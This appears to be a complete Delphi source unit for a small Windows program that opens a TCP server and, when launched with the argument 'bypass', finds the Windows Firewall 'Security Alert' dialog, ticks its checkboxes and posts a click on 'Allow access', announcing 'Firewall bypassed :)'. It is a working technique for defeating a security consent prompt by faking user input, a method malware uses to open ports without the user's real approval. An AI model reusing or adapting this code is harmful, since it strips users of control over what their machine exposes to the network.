unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ExtCtrls, IdContext,
  IdBaseComponent, IdComponent, IdCustomTCPServer, IdTCPServer;

type
  TForm1 = class(TForm)
    IdTCPServer1: TIdTCPServer;
    Label1: TLabel;
    procedure FormCreate(Sender: TObject);
    procedure IdTCPServer1Exception(AContext: TIdContext;
      AException: Exception);
    procedure IdTCPServer1Execute(AContext: TIdContext);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

function EnumCheckBoxes(hWnd: hWnd; lParam: lParam): Boolean; stdcall;
begin
  PostMessage(hWnd, BM_SETCHECK, BM_SETCHECK, 0);
end;

procedure TForm1.FormCreate(Sender: TObject);
var
  H1, H2: THandle;
  Rec: TRect;
  MousePos: TPoint;
begin
  IdTCPServer1.Active:= True;
  if (ParamStr(1) = 'bypass') then
  begin
    H1 := 0;
    H2 := 0;
    while (H1 = 0) or (H2 = 0) do
    begin
      H1 := FindWindow('#32770', 'Windows Security Alert');
      H2 := FindWindowEx(H1, 0, 'Button', '&Allow access');
    end;
    EnumChildWindows(H1, @EnumCheckBoxes, 0);
    PostMessage(H1, WM_COMMAND, MakeWParam(GetDlgCtrlID(H2), BN_CLICKED), H2);
    Label1.Caption:= 'Firewall bypassed :)';
  end;
end;

procedure TForm1.IdTCPServer1Exception(AContext: TIdContext;
  AException: Exception);
begin
//
end;

procedure TForm1.IdTCPServer1Execute(AContext: TIdContext);
begin
//
end;

end.
